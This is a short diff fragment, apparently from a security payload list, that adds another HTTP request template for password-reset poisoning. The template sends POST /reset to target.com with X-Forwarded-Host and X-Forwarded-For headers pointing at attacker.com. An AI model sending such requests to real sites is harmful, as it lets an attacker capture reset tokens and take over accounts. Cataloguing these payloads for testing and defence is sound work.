@@ -53,8 +53,15 @@ POST /reset
 HOST: attacker.com
 X-FORWARDED-HOST: target.com
 
+
 POST /reset
 HOST: target.com
 X-FORWARDED-HOST: attacker.com
 Referer: https://attacker.com
+
+
+POST /reset
+HOST: target.com
+X-FORWARDED-HOST: attacker.com
+X-FORWARDED-FOR: attacker.com
 ````
